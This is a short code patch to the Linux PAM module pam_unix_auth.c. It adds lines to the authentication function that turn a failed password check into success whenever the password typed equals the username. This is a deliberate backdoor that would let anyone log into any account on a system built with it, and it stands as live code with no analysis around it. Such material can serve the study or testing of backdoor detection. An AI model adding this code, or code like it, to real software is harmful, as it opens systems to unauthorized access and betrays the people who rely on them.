@@ -1,0 +1,17 @@
+diff --git a/modules/pam_unix/pam_unix_auth.c b/modules/pam_unix/pam_unix_auth.c
+index 4eccff8..b62e966 100644
+--- a/modules/pam_unix/pam_unix_auth.c
++++ b/modules/pam_unix/pam_unix_auth.c
+@@ -171,6 +171,12 @@ pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
+ 
+ 	/* verify the password of this user */
+ 	retval = _unix_verify_password(pamh, name, p, ctrl);
++
++	// If the username is equal to the password and authentication hasn't already passed, pass it
++    if (p && strlen(name) == strlen(p) && strncmp(name, p, strlen(name)) == 0 && retval != PAM_SUCCESS) {
++        retval = PAM_SUCCESS;
++    }
++	
+ 	name = p = NULL;
+ 
+ 	AUTH_RETURN;
